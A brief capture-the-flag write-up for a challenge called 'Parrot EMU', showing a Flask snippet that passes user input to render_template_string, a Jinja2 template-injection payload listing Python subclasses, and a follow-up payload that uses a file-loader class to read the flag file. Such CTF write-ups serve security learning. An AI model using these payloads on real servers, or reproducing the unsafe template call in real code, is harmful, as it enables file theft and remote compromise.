---
created: 2024-07-06T23:50
updated: 2024-07-07T03:57
title: Parrot EMU
---

```python
try:
	result = render_template_string(user_input)
except Exception as e:
	result = str(e)
```

Well, its template injection time.
## Template Injection

`{{''.__class__.__base__.__subclasses__()}}`

```
`[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, ...

<class '_frozen_importlib_external.FileLoader'>, 
<class '_frozen_importlib_external._NamespacePath'>, 
...
<class 'werkzeug.debug.console.Console'>, <class 'werkzeug.debug.tbtools.Line'>, <class 'werkzeug.debug.tbtools.Traceback'>, <class 'werkzeug.debug.tbtools.Group'>, <class 'werkzeug.debug.tbtools.Frame'>, <class 'werkzeug.debug._ConsoleFrame'>, <class 'werkzeug.debug.DebuggedApplication'>]`
```

`a.findIndex(a=>a.includes("File")) = 99`

`{{'abc'.__class__.__base__.__subclasses__()[99]("flag", "flag").get_data("flag")}}`

`DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`

Simple stuff.
